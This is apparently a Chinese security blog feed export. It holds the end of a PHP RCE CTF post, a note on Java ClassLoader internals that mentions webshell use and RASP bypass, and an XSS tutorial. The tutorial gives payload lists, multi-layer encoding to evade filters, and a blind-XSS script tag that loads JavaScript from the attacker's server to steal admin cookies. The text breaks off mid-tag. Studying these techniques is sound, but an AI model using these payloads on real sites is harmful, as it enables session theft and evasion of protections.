class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(!<span class="string">&#x27;&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!!<span class="string">&#x27;&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!<span class="string">&#x27;&#x27;</span>+!!<span class="string">&#x27;&#x27;</span>);<span class="comment">//int(1)</span></span><br><span class="line"><span class="comment">//直接放下标也行</span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$_</span>[!<span class="string">&#x27;&#x27;</span>];<span class="comment">//赋值$_[1]</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[!!<span class="string">&#x27;&#x27;</span>];<span class="comment">//赋值$_[0]</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类加载机制</title>
      <link href="/2022/07/02/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/07/02/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><h2 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h2><h3 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h3><p>类加载器：通过一个类全限定名称来获取其二进制文件（.class）流的工具。</p><p>类加载器都是抽象类ClassLoader的子类</p><p>java类编译后的.class文件开头字节码是cafe babe  ，字节码被ClassLoder加载到JVM中</p><p>Bootstrap ClassLoader 最顶层ClassLoader</p><p>即使一个ClassLoader继承了ClassLoader其父类也是AppClassLoader</p><h3 id="JVM框架图"><a href="#JVM框架图" class="headerlink" title="JVM框架图"></a>JVM框架图</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040005015.png"                      alt="image-20221009155611940"                ><figcaption>image-20221009155611940</figcaption></figure></p><blockquote><p>编译</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TestHelloWorld.java</span><br></pre></td></tr></table></figure></div><p>反汇编生成字节码</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -c TestHelloWorld</span><br></pre></td></tr></table></figure></div><p>JVM在执行<code>TestHelloWorld</code>之前会先解析class二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p></blockquote><h2 id="ClassLoder"><a href="#ClassLoder" class="headerlink" title="ClassLoder"></a>ClassLoder</h2><p>一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><blockquote><p>获取类加载器时有时会返回一个null对象，可能是该类被JVM初始化是被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写,获取该类加载器加载的类的ClassLoader时会返回null</p></blockquote><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><h2 id="类加载流程"><a href="#类加载流程" class="headerlink" title="类加载流程"></a>类加载流程</h2><p><code>ClassLoader</code>加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类重要流程如下：</p><ul><li>ClassLoader调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li><li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.anbai.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ul><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类,其子类加载器通过继承其并重写了<code>findClass</code>方法实现了新的功能</p><p>因此我们也可以通过重写<code>findClass</code>方法来自定义一个类加载器</p><p>自定义类<code>demo.ClassloaderDemo.TestHelloWorld</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.ClassLoaderDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        String a=<span class="string">&quot;小雨奕奕，永远热恋&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>自定义类加载器</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.ClassLoaderDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;demo.ClassLoaderDemo.TestHelloWorld&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>,-<span class="number">2</span>,-<span class="number">70</span>,-<span class="number">66</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">60</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">62</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">86</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">76</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">78</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">84</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">59</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">83</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">70</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">84</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">46</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">35</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">67</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">76</span>,<span class="number">111</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">68</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">84</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">33</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">42</span>,-<span class="number">73</span>,<span class="number">0</span>,<span class="number">1</span>,-<span class="number">79</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">27</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">18</span>,<span class="number">2</span>,-<span class="number">80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">12</span>,</span><br><span class="line">    &#125;;<span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//反射获取hello方法调用</span></span><br><span class="line">            Class&lt;?&gt; aClass = a.loadClass(testClassName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">hello</span> <span class="operator">=</span> o.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">invoke</span> <span class="operator">=</span> (String)hello.invoke(o);</span><br><span class="line">            System.out.println(invoke);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | InstantiationException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040005403.png"                      alt="image-20221009165342719"                ><figcaption>image-20221009165342719</figcaption></figure></p><blockquote><p>利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）。</p></blockquote><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p><p>TODO….</p>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习</title>
      <link href="/2022/05/14/XSS%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/14/XSS%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>攻击者在网页中嵌入客户端脚本，主要利用js编写的恶意代码来执行一些想要的功能</p><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040011036.jpg"                      alt="image-20220818210936052"                ><figcaption>image-20220818210936052</figcaption></figure></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>依据效果可分为三类</p><ul><li><p>反射型: 非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，服务器端就会接收并处理带有攻击代码的数据，然后返回到浏览器中，完成攻击，这个过程就像一次反射。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗</p></li><li><p>存储型：持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</p></li><li><p>DOM 型：DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</p></li></ul><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>特点：非持久化，必须用户点击带有特定参数的链接才可以起作用</p><p>一个简单的例子，点击后跳转百度</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;点击此处修复&quot;</span>);location.<span class="property">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>常出现在get方式传参</p></blockquote><h2 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h2><p>在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码。</p><p>特点：可以持续攻击。</p><blockquote><p>最有可能出现的位置：留言板、评论区、用户头像、个性签名、博客等等。</p></blockquote><p>写入留言板</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>访问时会自动跳转百度</p></blockquote><h2 id="Dom型"><a href="#Dom型" class="headerlink" title="Dom型"></a>Dom型</h2><h2 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a><strong>JavaScript伪协议</strong></h2><ul><li>Data伪协议：</li></ul><p>​<code>data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=</code></p><ul><li>JavaScript伪协议：</li></ul><p>​<code>onfocus=javascript:alert(&quot;1&quot;)</code></p><p>​<code>&lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt;</code></p><h2 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h2><ul><li><p>遇到对尖括号&lt; &gt;进行转义的，可将payload进行Unicode编码</p></li><li><p>对<code>&lt;script&gt;</code>标签进行过滤，可以尝试大小写，双写，或其它标签，例如:<a>、<img>等等</p><p><code>&lt;a href=javascript:alert(1)&gt;XSS&lt;/a&gt;</code></p><p><code>&lt;img src=111 onerror=alert(&#39;xss&#39;)&gt;</code></p></li><li><p>如果不能通过属性进行跨站，那么还可以利用时间处理函数</p></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type = <span class="string">&quot;button&quot;</span>  value = <span class="string">&quot;clickme&quot;</span> οnclick=<span class="string">&quot;alert(‘click me‘)&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></div><ul><li>闭合网页中的标签，使自己的xss可以被执行（&#x2F;&#x2F;可以注释后面的内容）</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“Hi”);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//</span></span><br></pre></td></tr></table></figure></div><ul><li><p>针对开启了magic_quotes_gpc(这个是PHP中的安全设置)的网站，我们可以通过javascript中的String.fromCharCode方法来绕过</p></li><li><p>可以使用javascript: 伪协议的方式构造XSS</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;<span class="title class_">You</span> can trust me!&lt;/a&gt;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="XSS常用payload："><a href="#XSS常用payload：" class="headerlink" title="XSS常用payload："></a>XSS常用payload：</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="comment">// 用户点击a标签时出发href属性（跳转到href或执行js）</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span></span><span class="comment">// 当img标签的src属性无效时，会出发onerror事件</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span> /&gt;</span></span><span class="comment">// 当鼠标移过input标签时会触发onmouseover事件</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="comment">// 当style标签载入成功时会触发onload事件</span></span><br></pre></td></tr></table></figure></div><h2 id="编码混淆"><a href="#编码混淆" class="headerlink" title="编码混淆"></a>编码混淆</h2><p>一定要遵循浏览器的规则才可以确保代码能够被浏览器理解！！！</p><h3 id="1-混合编码"><a href="#1-混合编码" class="headerlink" title="(1)混合编码"></a>(1)混合编码</h3><p>如：对<code>&lt;a href=javascript:alert(/XSS/)&gt;test&lt;/a&gt;</code>编码</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74:\u0061\u006c\u0065\u0072\u0074(/XSS/)&quot;</span>&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><p>其中对JavaScript进行了<a class="link"   href="https://www.qqxiuzi.cn/bianma/zifushiti.php" >html实体编码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>对alert进行了<a class="link"   href="https://www.bejson.com/convert/unicode_chinese/" >Unicode编码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这样一来在保证代码能够正常执行的前提下，还可以绕过一些防护</p><h3 id="2）二层混淆"><a href="#2）二层混淆" class="headerlink" title="2）二层混淆"></a>2）二层混淆</h3><p>二层混淆就是对XSS代码在遵循浏览器解码规则的情况下进行两次编码，让防护软件无法理解XSS代码，进而绕过防护软件。</p><ul><li>javascript（最后） &lt; unicode（其次） &lt; html（最先被解码）</li></ul><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(/XSS/)&quot;</span>&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><p>上面的alert经过了双重编码，先是Unicode编码，然后又经过Url编码（所有字符都要编码），这里提供一个网站<a class="link"   href="http://web.chacuo.net/charseturlencode/" >在线urlencode编码、urldecode解码、url编码解码、百分号编码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，JavaScript依旧是html实体编码</p><h3 id="3）三层混淆"><a href="#3）三层混淆" class="headerlink" title="3）三层混淆"></a>3）三层混淆</h3><p>三层混淆就是在二层混淆的基础上再增加一次编码，让防护软件无法理解，前提还是要遵循浏览器的解析规则，使代码能够被浏览器理解！！！</p><p>还是以上面那个为例，只要将alert再进行一次html实体编码即可</p><h2 id="实战XSS思路"><a href="#实战XSS思路" class="headerlink" title="实战XSS思路"></a>实战XSS思路</h2><p><a class="link"   href="https://www.sqlsec.com/2020/10/xss2.html" >https://www.sqlsec.com/2020/10/xss2.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="盲打"><a href="#盲打" class="headerlink" title="盲打"></a>盲打</h3><p>输入处直接拼接js代码，访问自己服务器上的js文件</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.20.24.244/xss/myjs/x.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>也可以去掉双引号</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//10.20.24.244/xss/myjs/x.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>当对方查看我们输入表单内容时(一般是后在查看)，可以利用js代码获取其cookie以及后台url，这样就可以以管理员身份登录</p><div class="highlight-container" 